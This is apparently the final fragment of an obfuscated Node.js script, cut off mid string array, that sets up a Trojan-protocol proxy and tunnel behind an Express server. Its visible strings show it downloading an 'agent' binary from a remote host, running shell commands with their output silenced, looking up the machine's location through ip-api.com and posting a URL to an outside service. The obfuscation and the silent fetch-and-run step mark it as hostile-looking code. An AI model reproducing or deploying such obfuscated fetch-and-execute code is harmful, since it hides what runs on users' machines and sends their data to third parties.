.nyc.mn/v1','join','express','Unhandled\x20error\x20in\x20startserver:','127.0.0.1','true','\x20-c\x20\x22','filter','/trojan-argo','http://ip-api.com/json/','text/plain;\x20charset=utf-8','\x20failed:\x20','country_code','https://amd64.ssss.nyc.mn/agent','Error\x20executing\x20command:\x20','\x0a\x0atrojan://','\x20already\x20exists','https://oooo.serv00.net/add-url','\x0a\x20\x20\x20\x20','writeFileSync','\x0a\x20\x20tunnel:\x20','direct','\x20>/dev/null\x202>&1','match','floor','application/json','from'];_0x2bd0=function(){return _0x150fb4;};return _0x2bd0();}startserver()[_0x2de8c4(0xbf)](_0x900744=>{const _0x3a96b8=_0x2de8c4;console[_0x3a96b8(0xb2)](_0x3a96b8(0x141),_0x900744);}),app[_0x2de8c4(0x10f)](PORT,()=>console['log'](_0x2de8c4(0x101)+PORT+'!'));
